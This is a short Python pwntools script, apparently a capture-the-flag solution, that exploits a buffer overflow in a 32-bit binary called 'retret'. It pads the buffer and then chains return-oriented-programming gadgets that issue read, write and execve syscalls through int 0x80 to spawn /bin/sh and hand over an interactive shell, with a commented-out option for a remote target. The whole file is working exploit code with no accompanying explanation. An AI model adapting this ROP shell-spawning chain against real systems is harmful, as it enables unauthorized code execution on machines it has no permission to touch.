from pwn import *

#0x08048375: pop ebx; ret
#0x08048542: int 0x80; ret
#0x08048552: pop eax; pop ecx; ret
#0x08048580: pop edx ret;

p = process('./retret')
#p = remote('192.168.0.25', 11111)

exploit = "A"*7680

# 0x0804a000 GOT

##############  read(0,0x0804a000, 8);
exploit += p32(0x08048375)  # pop ebx; ret
exploit += p32(0x0)         # ebx 0
exploit += p32(0x08048552)  # pop eax; pop ecx; ret
exploit += p32(0x3)         # eax system call : 0x03 : sys_read
exploit += p32(0x0804a000)  # ecx 0x0804a000
exploit += p32(0x08048580)  # pop edx; ret
exploit += p32(0x8)         # edx 8
exploit += p32(0x08048542)  # int 0x80; ret


##############  write(1,0x0804a000, 8);
exploit += p32(0x08048375)  # pop ebx; ret
exploit += p32(0x1)         # ebx 1
exploit += p32(0x08048552)  # pop eax; pop ecx; ret
exploit += p32(0x4)         # eax system call : 0x04 : sys_write
exploit += p32(0x0804a000)  # ecx 0x0804a000
exploit += p32(0x08048580)  # pop edx; ret
exploit += p32(0x8)         # edx 8
exploit += p32(0x08048542)  # int 0x80; ret


##############  execve(0x0804a000, 0, 0);
exploit += p32(0x08048375)  # pop ebx; ret
exploit += p32(0x0804a000)  # ebx 0x0804a000
exploit += p32(0x08048552)  # pop eax; pop ecx; ret
exploit += p32(0xb)         # eax system call : 0x0b : sys_execve
exploit += p32(0x0)         # ecx 0
exploit += p32(0x08048580)  # pop edx; ret
exploit += p32(0x0)         # edx 0
exploit += p32(0x08048542)  # int 0x80; ret

exploit += "A" * 416           # buffer full : linux maximum 8196 (7680 + 32 + 32 + 32 + 416 + 4 )
exploit += "/bin/sh\x00"

p.send(exploit)
p.interactive()
